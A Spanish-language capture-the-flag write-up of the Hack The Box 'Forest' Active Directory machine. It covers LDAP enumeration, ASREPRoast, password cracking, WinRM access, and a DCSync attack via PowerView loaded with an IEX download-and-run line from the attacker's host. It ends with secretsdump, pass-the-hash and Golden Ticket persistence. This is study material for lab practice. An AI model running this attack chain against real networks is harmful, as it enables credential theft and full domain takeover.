---
title: Forest
published: true
categories: [Active Directory,Easy]
tags: [Active directory explotation]

image:
  path: https://user-images.githubusercontent.com/55555187/161040497-b45d5306-e9b0-4433-8e67-a712d9b5ed96.png
  lqip: data:image/webp;base64,UklGRpoAAABXRUJQVlA4WAoAAAAQAAAADwAABwAAQUxQSDIAAAARL0AmbZurmr57yyIiqE8oiG0bejIYEQTgqiDA9vqnsUSI6H+oAERp2HZ65qP/VIAWAFZQOCBCAAAA8AEAnQEqEAAIAAVAfCWkAALp8sF8rgRgAP7o9FDvMCkMde9PK7euH5M1m6VWoDXf2FkP3BqV0ZYbO6NA/VFIAAAA

---

Forest es una <font color="#98E256">máquina Easy</font> de temática <font color="#8E44AD">Active Directory</font> que toca explotación del servicio ldap, ASREPRoast en Kerberos, DCSync mediante PowerView y Golden Ticket para garantizar persistencia.

## Reconocimiento

Una vez que compruebo que la máquina está operativa, lanzo un escaneo de puertos con nmap.

```
nmap -p- --open -sS --min-rate 5000 -Pn -n -vvv 10.10.10.161
```

Obteniendo los siguiente puertos abiertos:

<img src="https://user-images.githubusercontent.com/55555187/160905820-30369083-6b99-4f85-b189-1c2c561ff344.png" title="" alt="recon1" width="264">

Lanzo un reconocimiento de servicio y versión sobre dichos puertos con nmap.

```
nmap -sC -sV -p53,88,135,139,389,445,464,593,636,3268,3269,5985,9389,47001,49664,49665,49666,49667,49671,49676,49677,49684,49703,49941 10.10.10.161
```

![recon2](https://user-images.githubusercontent.com/55555187/160905822-5a38cde5-90ef-42e9-8ce8-2064384d2081.png)

Lo primero relevante es que estamos ante un **Directorio activo** con dominio **htb.local**como se puede ver en la cabecera del puerto 389.

También se puede ver que **kerberos**, **ldap**, **winRM** y **Samba**, entre otros,  están abierto lo cual ya abre posibles vectores de reconocimiento y de ataque. 

Viendo que está el servicio **ldap** abierto y que no parece que haya ninguna vía potencial para listar usuarios (como por ejemplo un servicio HTTP con información relevante), decido probar si las consultas ldap anónimas están habilitadas.

```
ldapsearch -x -h 10.10.10.161 -s base namingcontexts
```

-x: sirve para realizar una autenticación simple sin proporcionar credenciales.

-h: sirve para indicar la dirección del host sobre el que realizaremos la consulta.

-s: sirve para indicar el scope de la búsqueda en función de la jerarquía de directorios.

En caso de que ldap se estuviese ejecutando en un puerto que no fuese el 389, podriamos indicarle el puerto mediante:

```
ldapsearch -x -H ldap://10.10.10.161:<puerto>
```

Tras realizar la consulta veo que, efectivamente, puedo lanzar consultar ldap anónimamente al observar lo siguiente:

<img src="https://user-images.githubusercontent.com/55555187/160905797-ad84a739-aebd-4299-8150-d619fbb6b544.png" title="" alt="recon3" width="486">

Teniendo el namingContext **DC=htb, DC=local**, puedo lanzar consultas más interesantes.

## Obtención de acceso

Al poder lanzar consultas ldap, tengo una forma de obtener los usuarios del dominio (entre otras muchas cosas). Lanzo una consulta para obtener todos los objetos que tengan **ObjectClass=person**.

```
ldapsearch -x -h 10.10.10.161 -b "DC=htb,DC=local" "(ObjectClass=person)"
```

Filtrando por el campo **userPrincipalName** puedo obtener los usuarios.

```
ldapsearch -x -h 10.10.10.161 -b "DC=htb,DC=local" "(ObjectClass=person)" | grep userPrincipalName
```

<img src="https://user-images.githubusercontent.com/55555187/160905803-e038486b-ef22-4113-9ac3-feef6940a9cf.png" title="" alt="recon4" width="554">

Realizando un poco más de filtrado utilizando **awk** y **tail** obtengo una lista de usuarios potenciales.

Con la lista de usuarios y sabiendo que kerberos está abierto, lanzo un ASREPRoast attack intentando ver si algún usuario tiene el permiso  DONT_REQ_PREAUTH activo pudiendo obtener un KRB_AS_REP cifrado con su contraseña.

```
GetNPUsers.py htb.local/ -no-pass -usersfile users.txt
```

Por desgracia, ninguno de los usuarios es ASREPRoasteable.

![recon5](https://user-images.githubusercontent.com/55555187/160905808-6dcc303a-4c26-4bc6-9dd5-09d7eda6e6e6.png)

Pruebo a obtener todos los servicios a través de una consulta ldap ya que puede darse el caso de el dominio tenga un usuario corriendo un servicio con el permiso DONT_REQ_PREAUTH.

```
ldapsearch -x -h 10.10.10.161 -b "DC=htb,DC=local" "(ObjectClass=*)" | grep svc
```

Obteniendo la cuenta **svc-alfresco**.

![recon6](https://user-images.githubusercontent.com/55555187/160905812-bd3d2a4e-84f5-4954-b4d6-78665c3c4d59.png)

Pruebo a realizar un ASREPRoast attack sobre él.

```
GetNPUsers.py htb.local/svc-alfresco -no-pass 
```

Obteniendo un KRB_AS_REP.

![recon7](https://user-images.githubusercontent.com/55555187/160905814-457fd74d-760e-4303-99ac-acc458493df7.png)

Lo crackeo con John y obtengo su contraseña (**s3rvice**):

```
john --wordlist=/usr/share/wordlists/rockyou.txt hash
```

Compruebo las credenciales con **crackmapexec** y miro si el usuario tiene acceso a alguna carpeta compartida por samba.

```
crackmapexec smb 10.10.10.161 -u svc-alfresco -p s3rvice
```

![recon8](https://user-images.githubusercontent.com/55555187/160905816-fb2a48c1-5f6e-445f-9bae-c7052d3dee4c.png)

Sabiendo que winRM está abierto por el puerto 5985, pruebo a conectarme como svc-alfresco al sistema.

```
evil-winrm -i 10.10.10.161 -u svc-alfresco -p s3rvice
```

![recon9](https://user-images.githubusercontent.com/55555187/160905818-efe2fd4a-c16d-42bf-8886-74f6951de3c4.png)

## Escalada de privilegios

Una vez que he obtenido acceso **bloodhound** para realizar un análisis de las posibles vias de escalada.

Para lanzar bloodhound hago lo siguiente:

1- Lanzo el servicio neo4j.

```
start neoj4 console
```

2- Lanzo bloodhound.

```
bloodhound &>/dev/null &
```

3- Obtengo los datos lanzando bloodhound.py desde mi equipo.

```
bloodhound.py -c all -u 'svc-alfresco' -p 's3rvice' -ns 10.10.10.161 -d htb.local
```

Obteniendo los siguientes archivos que posteriormente exporto a bloodhound:

![recon18](https://user-images.githubusercontent.com/55555187/161037389-3cbab530-38c1-404e-ab64-450f3e79fad3.png)

Una vez en bloodhound, marco svc-alfresco como owned y procedo a mirar sus relaciones.

Observo que es miembro de 9 grupos indirectamente. Uno de ellos **Account operators**, grupo que permite a sus integrantes administrar usuarios y grupos del dominio.

<img src="https://user-images.githubusercontent.com/55555187/161037385-84364cea-e44f-4cad-91e9-d3afda00241c.png" title="" alt="recon10" width="543">

Observando además las relaciones de todos los usuarios y grupos del dominio, observo que un buen vector de escalada podría ser crear un usuario mediante los permisos que el grupo Account operators otorga a svc-alfresco, añadirle al grupo **Exchange Windows Permissions** y otorgarle permisos DSync para poder realizar un DCSync Attack.

<img src="https://user-images.githubusercontent.com/55555187/161037064-7923ce23-03ef-4def-a737-8ad86f86b45d.png" title="" alt="recon11" width="551">

Creo un usuario mediante el binario net.exe y lo añado al grupo Exchange Windows Permissions:

```
net user kripteria kripteria123 /add /domain
net group "Exchange Windows Permissions" /add kripteria
```

Posteriormente, siguiente los pasos estipulados en los consejos de bloodhound, ejecuto PowerView.ps1 (alojado en mi máquina) mediante Invoke-Expression y mediante Add-ObjectACL doy permisos al DCSync al usuario kripteria.

```
IEX(new-object net.webclient).downloadstring('http://10.10.14.21/PowerView.ps1')
$pass = convertto-securestring 'kripteria123' -asplain -force
$cred = new-object system.management.automation.pscredential('htb\kripteria', $pass)
Add-ObjectACL -PrincipalIdentity kripteria -Credential $cred -Rights DCSync
```

Una vez que tengo permisos, ejecuto **secretsdump.py** de impacket para dumpear los hashes NTLM del NTDS.DIT.

```
secretsdump.py htb.local/kripteria:kripteria123@10.10.10.161
```

<img src="https://user-images.githubusercontent.com/55555187/161037067-867cd49c-4071-4a9f-b3b9-9820c08c9080.png" title="" alt="recon12" width="603">

Con el hash NTLM del usuario Administrator y haciendo pass the hash en evil-winrm consigo entrar en su cuenta.

![recon13](https://user-images.githubusercontent.com/55555187/161037068-03a67c4e-cb6e-47af-b147-201430a44283.png)

También puedo hacerlo a través de psexec.py.

![recon14](https://user-images.githubusercontent.com/55555187/161037074-68a15340-14dd-4977-8595-3801c21e61db.png)

## Persistencia

Al dumpear el NTDS.DIT, también tenemos acceso al hash NTLM del usuario krbtgt lo cual nos posibilita poder crear un **golden ticket**.

A la hora de crear el golden ticket, aparte del hash NTLM también necesitamos el SID del usuario que se puede obtener de forma sencilla mediante:

```
wmic useraccount get name,sid
```

![recon15](https://user-images.githubusercontent.com/55555187/161037056-a0a0e0c6-fa69-4b30-992e-f03b3472c974.png)

Con el NTLM y el SID, puedo crear tickets TGT que me permitan entrar a cualquier servicio del dominio utilizando el script **ticketer.py** de impacket.

```
tiketer.py -nthash <hash de krbtgt> -domain-sid <sid de krbtgt> -domain htb.local <usuario a impersonar>
```

Una vez que se genera el ticket tenemos que exportar su ruta a la variable de entorno **KRB5CCNAME**.

```
export KRB5CCNAME=<ruta al archivo .ccache>
```

Una vez hecho esto, podemos conectarnos con psexec utilizando las opciones -k y -no-pass.

```
psexec.py htb.local/<usuario>@forest.htb.local -k -no-pass
```

*Nota 1 : es posible que al intentar conectarse sale el error KRB_AP_ERR_SKEW(Clock skew too great) que significa que la diferencia horaria entre nuestra máquina y la máquina forest es demasiado elevada. Podemos arreglando lanzando rdate -n 10.10.10.161 o cambiando la hora de nuestra máquina de forma manual.*

*Nota 2: También es posible que al intentar conectarse salga el error KDC_ERR_S_PRINCIPAL_UNKNOWN(Server not found in Kerberos database) si nos intentamos conectar tanto por ip como bajo el dominio @htb o @htb.local. Esto es debido a que el servidor DNS de la máquina se encuentra en la dirección forest.htb.local.*



En esta máquina, por defecto, podemos impersonar tanto a Administrator como a svc-alfresco:

<img src="https://user-images.githubusercontent.com/55555187/161037059-984eac5d-e7b6-4051-8d82-3301df0ebad5.png" title="" alt="recon16" width="603">

<img src="https://user-images.githubusercontent.com/55555187/161037061-eb8a6005-c288-4407-bf22-36d83a4c4776.png" title="" alt="recon17" width="606">

Este método de persistencia es muy efectivo ya que, aunque Administrator y svc-alfresco cambien sus contraseñas, podemos seguir conectandonos igualmente. La única forma de eliminar este factor de persistencia es cambiando la contraseña del usuario krbtgt.


